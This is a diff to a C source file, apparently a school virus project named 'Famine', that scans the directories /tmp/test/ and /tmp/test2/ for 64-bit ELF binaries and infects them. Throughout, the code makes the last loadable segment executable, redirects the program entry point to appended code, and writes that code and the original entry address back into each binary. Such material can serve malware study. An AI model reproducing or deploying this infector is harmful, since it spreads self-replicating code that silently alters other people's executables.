@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/05/27 16:15:06 by root             ###   ########.fr       */
+/*   Updated: 2018/05/28 18:16:02 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,6 +22,8 @@
 #include "ft_printf.h"
 
 #define OPEN		2
+#define CLOSE		3
+#define MSYNC		26
 #define GETDENTS64	217
 #define LSEEK		8
 #define MMAP		9
@@ -39,9 +41,9 @@ char		*direct[] = { "/tmp/test/", "/tmp/test2/", NULL };
 
 void	find_files(char *dir);
 void	get_dat_elf(char *dir, char *file);
-void	pack_dat_elf(int fd, int size, char *data);
+void	pack_dat_elf(char *path, int size, char *data);
 void	famine64_func(void);
-uint32_t	famine64_size = 42;
+extern uint32_t	famine64_size;
 
 int main(int ac, char **av)
 {
@@ -59,7 +61,7 @@ void	find_files(char *dir)
 	int		ret;
 	int		off;
 	
-	fd = syscall(OPEN, dir, 0, 0);
+	fd = syscall(OPEN, dir, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0);
 	if (fd == -1)
 		return ;
 	while ((ret = syscall(GETDENTS64, fd, buff, 1024)) > 0)
@@ -72,7 +74,7 @@ void	find_files(char *dir)
 			off = off + *(buff + off + 16);
 		}
 	}
-	close(fd);
+	syscall(CLOSE, fd);
 }
 
 void	get_dat_elf(char *dir, char *file)
@@ -97,32 +99,38 @@ void	get_dat_elf(char *dir, char *file)
 		j++;
 	}
 	path[i + j] = '\0';
-	fd = syscall(OPEN, path, 0, 0);
-	if (fd == -1)
+	fd = syscall(OPEN, path, O_RDWR|O_NONBLOCK, 0);
+	if (fd == -1){
+		write(1, "OPEN file failed\n", 17);
 		return ;
+	}
 	size = syscall(LSEEK, fd, 1, SEEK_END);
 	if (size == -1)
 	{
+		write(1, "SEEK file failed\n", 17);
 		close(fd);
 		return ;
 	}
+
 	data = (void *)syscall(MMAP, NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
 	if (data == MAP_FAILED)
 	{
+		write(1, "MMAP file failed\n", 17);
 		close(fd);
 		return ;
 	}
-	pack_dat_elf(fd, size, data);
-	close(fd);
+	syscall(CLOSE, fd);
+	pack_dat_elf(path, size, data);
 	syscall(MUNMAP, data, size);
 }
 
-void		pack_dat_elf(int fd, int size, char *data)
+void		pack_dat_elf(char *path, int size, char *data)
 {
 	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F'	&&
-		data[4] == 2 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
+		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
 		// Ajouter le check de signature de binaire
 	{
+
 		/* 1. Find the highest memory mapped PT_LOAD segment */
 		size_t	phoff = ((Elf64_Ehdr *)data)->e_phoff;
 		Elf64_Phdr *program = (Elf64_Phdr *)(data + phoff);
@@ -135,6 +143,9 @@ void		pack_dat_elf(int fd, int size, char *data)
 				}
 			}
 		}
+		if (iprogram == NULL)
+			return ;
+
 		/* Extra: Change the offset of sections higher than our code offset, for debug. */
 		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
 		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
@@ -143,28 +154,58 @@ void		pack_dat_elf(int fd, int size, char *data)
 				section[i].sh_offset += famine64_size;
 			}
 		}
+
+		printf("entry:%p off:%#x flags:%#x memsz:%#x filesz:%#x\n",
+			   ((Elf64_Ehdr *)data)->e_entry, ((Elf64_Ehdr *)data)->e_shoff,
+			   iprogram->p_flags, iprogram->p_memsz, iprogram->p_filesz);
+
 		/* 2. Compute the virtual address of our code */
 		Elf64_Addr new_entry = iprogram->p_vaddr + iprogram->p_memsz;
+
 		/* 3. Change the elf header */
 		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
 		((Elf64_Ehdr *)data)->e_entry = new_entry;
 		((Elf64_Ehdr *)data)->e_shoff += famine64_size;
+
 		/* 4. Change the program header */
 		if ((iprogram->p_flags & PF_X) == 0)
 			iprogram->p_flags |= PF_X;
 		iprogram->p_memsz += famine64_size;
 		iprogram->p_filesz = iprogram->p_memsz;
-/* Get the offset in file to write our code */
+
+		printf("entry:%p off:%#x flags:%#x memsz:%#x filesz:%#x\n",
+			   ((Elf64_Ehdr *)data)->e_entry, ((Elf64_Ehdr *)data)->e_shoff,
+			   iprogram->p_flags, iprogram->p_memsz, iprogram->p_filesz);
+
+		int fd = syscall(OPEN, path, O_WRONLY, 0);
+		if (fd == -1){
+			write(1, "OPEN file failed\n", 17);
+			return ;
+		}
+		/* Get the offset in file to write our code */
 		size_t off = iprogram->p_offset + iprogram->p_memsz - famine64_size;
-		write(fd, data, off);
-		write(fd, &famine64_func, famine64_size - sizeof(old_entry));
-		write(fd, &old_entry, sizeof(old_entry));
-		write(fd, data + off, size - off);
+		printf("Writing %#x bytes...", off);
+		if (write(fd, data, off) <= 0)
+		{
+			perror("WRITE failed");
+			return ;
+		}
+		printf(" OK\nWriting %#x bytes...", famine64_size - sizeof(old_entry));
+		if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) <= 0)
+			return ;
+		printf(" OK\nWriting %#x bytes...", sizeof(old_entry));
+		if (write(fd, &old_entry, sizeof(old_entry)) <= 0)
+			return ;
+		printf(" OK\nWriting %#x bytes...", size - off);
+		if (write(fd, data + off, size - off) <= 0)
+			return ;
+		printf(" OK\n");
+//		syscall(MSYNC, data, size, MS_SYNC);
+		printf("%#x\n", famine64_size);
+		syscall(CLOSE, fd);
 	}
-	(void)fd;
-	(void)size;
-	(void)data;
 }
+
 /*
 		typedef struct
 		{
@@ -210,8 +251,3 @@ void		pack_dat_elf(int fd, int size, char *data)
 8			Elf64_Xword   sh_entsize;
 64		} Elf64_Shdr;
 */
-
-void		famine64_func(void)
-{
-	return ;
-}
